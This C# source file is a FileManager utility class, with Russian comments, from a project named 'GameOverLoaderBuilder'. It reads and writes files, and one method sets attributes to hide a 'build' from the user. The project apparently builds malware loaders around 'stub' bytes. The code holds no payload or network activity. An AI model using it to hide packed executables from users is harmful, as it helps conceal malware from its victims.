namespace GameOverLoaderBuilder
{
    #region Зависимости

    using System;
    using System.IO;

    #endregion

    /*
        Created by r3xq1
        https://github.com/r3xq1/
        Telegram: https://t.me/r3xq1
    */

    public static class FileManager
    {
        /// <summary>
        /// Метод для проверки файла на существование.
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static bool ExistsFile(string path) => File.Exists(path);

        /// <summary>
        /// Метод для проверки директории на существование.
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static bool ExistsDirectory(string path) => Directory.Exists(path);

        /// <summary>
        /// Метод для комбинирование путей через массив string[]
        /// </summary>
        /// <param name="paths"></param>
        /// <returns></returns>
        public static string CombinePath(params string[] paths)
        {
            string result = string.Empty;
            if (paths.Length > 0)
            {
                try
                {
                    result = Path.Combine(paths);
                }
                catch (Exception ex) { throw new Exception("Ошибка комбинирования путей.", ex); }
            }
            return result;
        }

        /// <summary>
        /// Метод для создания файла
        /// </summary>
        /// <param name="path">Путь сохранения</param>
        /// <param name="content">Текстовые данные</param>
        public static void CreateFile(string path, string content)
        {
            if (!string.IsNullOrWhiteSpace(path) && !string.IsNullOrWhiteSpace(content))
            {
                try
                {
                    File.WriteAllText(path, content);
                }
                catch (Exception ex) { throw new Exception("Error CreateFile!", ex); }
            }
        }

        /// <summary>
        /// Метод для записи байтов в файл
        /// </summary>
        /// <param name="pathdir">Полный путь к файлу для сохранения данных</param>
        /// <param name="bytes">Байт данные</param>
        public static void PackBytesInFile(string pathdir, byte[] bytes)
        {
            if (!string.IsNullOrWhiteSpace(pathdir))
            {
                try
                {
                    File.WriteAllBytes(pathdir, bytes);
                }
                catch (Exception ex) { throw new Exception("Error PackBytesInFile", ex); }
            }
        }

        /// <summary>
        /// Метод для считывания всех байтов из файл(а)ов
        /// </summary>
        /// <param name="filepath">Имя файла</param>
        /// <returns>Все байты из файла</returns>
        public static byte[] ReadBinaryFile(string filepath)
        {
            byte[] stubdata = null;
            if (!string.IsNullOrWhiteSpace(filepath))
            {
                try
                {
                    stubdata = File.ReadAllBytes(filepath);
                }
                catch (Exception ex) { throw new Exception("Error ReadBinaryFile", ex); }
            }
            return stubdata;
        }

        /// <summary>
        /// Метод для считывания всего текста из файла
        /// </summary>
        public static string ReaderText(string path)
        {
            string result;
            try
            {
                result = File.ReadAllText(path);
            }
            catch (Exception ex) { throw new Exception("Error ReaderText", ex); }
            return result;
        }

        /// <summary>
        /// Метод для получения имени файла из полного пути.
        /// </summary>
        /// <param name="path"></param>
        /// <returns></returns>
        public static string GetFileName(string path)
        {
            string result = string.Empty;
            try
            {
                result = Path.GetFileName(path);
            }
            catch { }
            return result;
        }

        /// <summary>
        /// Метод для получения имени директории
        /// </summary>
        /// <param name="path">Путь к директории</param>
        /// <returns>Имя директории</returns>
        public static string GetDirName(string path)
        {
            string result = string.Empty;
            try
            {
                result = Path.GetDirectoryName(path);
            }
            catch { }
            return result;
        }

        /// <summary>
        /// Метод для удаления файла
        /// </summary>
        /// <param name="pathfile">Путь к файлу</param>
        public static void DeleteFile(string pathfile)
        {
            if (ExistsFile(pathfile))
            {
                try
                {
                    File.Delete(pathfile);
                }
                catch (Exception ex) { throw new Exception("Error Delete File!", ex); }
            }
        }

        /// <summary>
        /// Метод для перемещения файла в другую папку
        /// </summary>
        /// <param name="from"></param>
        /// <param name="to"></param>
        public static void MoveExeFile(string from, string to)
        {
            if (!string.IsNullOrWhiteSpace(from) || !string.IsNullOrWhiteSpace(to))
            {
                try
                {
                    File.Move(from, to);
                }
                catch (Exception ex) { throw new Exception("FileMove Error", ex); }
            }
        }

        /// <summary>
        /// Метод для скрытия файла от пользователя
        /// </summary>
        /// <param name="path">Путь к файлу</param>
        /// <param name="attributes">Аттрибут скрытия</param>
        public static void Hide(string path, FileAttributes attributes)
        {
            try
            {
                File.SetAttributes(path, attributes);
            }
            catch (Exception ex) { throw new Exception("Error Hide Build", ex); }
        }
    }
}